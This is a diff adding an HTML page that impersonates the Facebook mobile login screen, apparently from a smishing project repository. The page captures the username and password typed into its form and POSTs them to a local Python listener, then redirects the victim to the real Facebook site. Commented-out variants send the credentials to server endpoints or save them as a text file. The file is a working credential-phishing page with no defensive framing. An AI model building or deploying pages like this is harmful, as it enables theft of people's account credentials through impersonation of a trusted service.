@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook - log in or sign up</title>
+    <!-- link to font -->
+    <link
+      href="https://fonts.googleapis.com/css?family=Open+Sans:400,700"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <!-- bootstrap CDN-->
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css"
+    />
+    <link rel="stylesheet" href="CSS/style.css" />
+
+  </head>
+
+  <body>
+    <!-----------------HEADER---------------->
+    <!-- Still need to adjust the scaling for the header section. When scaling to different screen size, img, text, and button jumps around.
+        I think its a problem with the way col is set up, not sure. -->
+    <div class="header row">
+      <div class="col col-3">
+        <img class="facebook-logo" src="CSS/facebook.png" alt="facebook" />
+      </div>
+      <div class="header-text col-6">
+        <h4>Facebook</h4>
+        <p>Open in the Facebook app</p>
+      </div>
+      <div class="col col-3">
+        <button class="open btn btn-lg btn-light" type="button">OPEN</button>
+      </div>
+    </div>
+
+    <!-------------------------LOGIN Section-------------------------->
+    <div class="row">
+      <div class="col col-12">
+        <!-- <img src="CSS/facebook-logo.png" alt="facebook-img" /> -->
+        <img
+          class="facebook"
+          src="https://i.postimg.cc/NMyj90t9/logo.png"
+          alt="Facebook"
+        />
+        <!-- <p>Connect with friends and the world around on Facebook</p> -->
+      </div>
+
+      <!-- User name and password section -->
+      <form id="inputForm">
+        <div class="login col-12"> 
+          <input
+            class="login-field"
+            id="userName"
+            type="text"
+            size="40"
+            placeholder="Mobile number or email"
+            
+          />
+     
+        </div>
+        <div class="login col-12">
+        
+          <input
+            class="create-field"
+            id="passWord"
+            type="password"
+            size="40"
+            placeholder="Password"
+            
+          />
+        
+        </div>
+        
+       <!-- Log in button as well as saving data to txt file -->
+       <div class="col-12">
+        <button
+          type="submit"
+          id="bt"
+          class="login-btn btn btn-primary btn-lg"
+          onclick="window.location.href='https://www.facebook.com/'; submitData()"
+        >
+        <b>Log In</b>
+        </button>
+
+      </form>
+        
+      </div>
+        <!-- create a new account section -->
+
+        <div class="forgot-pass col-12">
+          <a
+            href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
+            >Forgot Password?</a
+          >
+        </div>
+        <hr class="hr-text" data-content="or" />
+        <div class="col-12">
+          <button type="submit" class="create-btn btn btn-lg btn-outline-dark" onclick="window.location.href='https://www.facebook.com/reg/';">
+            <strong>Create new account</strong>
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-----------------------FOOTER---------------------------->
+    <div class="row">
+      <div class="language col-sm-6">
+        <p>English (US)</p>
+        <p>Français (French)</p>
+        <p>Português(Brasil)</p>
+        <p>Italiano</p>
+      </div>
+      <div class="language col-sm-6">
+        <p>Español</p>
+        <p>中国人</p>
+        <p>Deutsch</p>
+      </div>
+      <div class="footer-links col-sm-12">
+        <p>About • Help • More</p>
+        <p>Meta ©️ 2023</p>
+      </div>
+    </div>
+  </body>
+
+  <!-- This script saves it to a sqlite3 database -->
+  <!-- <script>
+    document
+      .getElementById("inputForm")
+      .addEventListener("submit", async (event) =>{
+        event.preventDefault();
+
+        const userName = document.getElementById("userName").value;
+        const passWord = document.getElementById("passWord").value;
+
+        const responses =await fetch("/pw", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({pw: passWord}),
+        });
+
+        const response =await fetch("/save-input", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({input: userName}),
+        });
+
+      });
+  </script> -->
+
+   <!-- This script saves gets the username and password and passes them to the Flask app -->
+    <script>
+      function submitData() {
+        document
+        .getElementById("inputForm")
+        .addEventListener("submit", async (event) =>{
+          event.preventDefault();
+
+          var xhr = new XMLHttpRequest();
+          xhr.open('POST', '/Users/karypaquot/documents/github/smishing-project/website/listener.py', true);
+          xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+          xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+            // Handle the response from the Python script
+              console.log(xhr.responseText);
+            }
+          };
+          var username = document.getElementById('userName').value;
+          var password = document.getElementById('passWord').value;
+          var requestBody = {
+            "username": username, 
+            "password": password
+          };
+          xhr.send(JSON.stringify(requestBody));
+        });
+      }      
+    </script>
+  
+
+  <!-- this script allows us to save credentials as json file using browser built-in API -->
+  <!-- <script>
+    // to handle event submission
+    function handleSubmit(event){
+      event.preventDefault();
+      const userName = document.getElementById("userName");
+      const password = document.getElementById("passWord");
+
+      // This variable stores all the user's log in credentials.
+      let credentials =
+        "\r Username: " +
+        userName.value +
+        " \r\n " +
+        "password: " +
+        password.value;
+     
+      //displaying the credentials 
+      console.log({credentials});
+      //converts credential values to JSON notation
+      JSON.stringify(credentials)
+    }
+    
+    //targeting the form
+    const form = document.querySelector("form");
+    form.addEventListener("submit", handleSubmit);
+
+    
+  </script> -->
+  <!-- This script allows us to save credentials as .txt file. leaving it here just in case -->
+
+  <!-- <script>
+    let saveFile = () => {
+      // Get the data from each element on the form.
+      const userName = document.getElementById("userName");
+      const password = document.getElementById("passWord");
+
+      // This variable stores all the data.
+      let data =
+        "\r Username: " +
+        userName.value +
+        " \r\n " +
+        "password: " +
+        password.value;
+
+      // Convert the text to BLOB.
+      const textToBLOB = new Blob([data], { type: "text/plain" });
+      const sFileName = "formData.txt"; // The file to save the data.
+
+      let newLink = document.createElement("a");
+      newLink.download = sFileName;
+
+      if (window.webkitURL != null) {
+        newLink.href = window.webkitURL.createObjectURL(textToBLOB);
+      } else {
+        newLink.href = window.URL.createObjectURL(textToBLOB);
+        newLink.style.display = "none";
+        document.body.appendChild(newLink);
+      }
+
+      newLink.click();
+    };
+  </script> -->
+</html>
